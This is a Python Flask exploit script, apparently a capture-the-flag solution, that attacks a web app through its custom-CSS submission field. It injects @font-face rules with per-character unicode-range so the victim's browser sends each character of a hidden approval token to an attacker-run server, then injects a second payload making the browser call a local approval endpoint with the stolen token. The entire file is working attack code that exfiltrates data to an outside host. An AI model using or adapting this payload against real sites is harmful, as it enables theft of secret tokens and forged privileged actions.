import requests
import re
from flask import Flask, request

app = Flask(__name__)

ATTACK_URL = "http://94.237.57.115:36967"
URL = "http://43.201.71.214:8080"
CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

token = []
s = requests.Session()
number = -1

def leak_approval_token():
    global number

    css = """
    #approvalToken {
        display: block !important;
        font-family: leak;
    }
    """

    for x in CHARS:
        css += f"""
    @font-face {{
        font-family: leak;
        src: url('{URL}/leak/{x}');
        unicode-range:U+{x.encode("unicode_escape").hex().zfill(4)};
    }}
    """

    resp = s.post(
            f"{ATTACK_URL}/api/submission/submit",
            json={
                "customCSS": css
            }
    )

    print(resp.text)

    match = re.search(r'Number (\d+)', resp.text)
    if match:
        number = match.group(1)
        print(number)

def approve_submission(approval_token):
    global number

    print("Approve Number:", number)

    css = """
    #approvalToken {
        display: block !important;
        font-family: leak;
    }
    """

    css += f"""
    @font-face {{
        font-family: leak;
        src: url('http://127.0.0.1:1337/approve/{number}/{approval_token}');
    }}
    """
    resp = s.post(
            f"{ATTACK_URL}/api/submission/submit",
            json={
                "customCSS": css
            }
    )

    print(resp.text)


@app.route("/start", methods=['GET', 'POST'])
def start():
    leak_approval_token()
    return "OK"

@app.route("/leak/<char>", methods=['GET', 'POST'])
def leak(char):
    token.append(char)

    if len(token) == 32:
        approval_token = "".join(sorted(token))
        print("Token: ", approval_token)
        approve_submission(approval_token)

    return "OK"

if __name__ == '__main__':
    app.run("0.0.0.0", port=8080)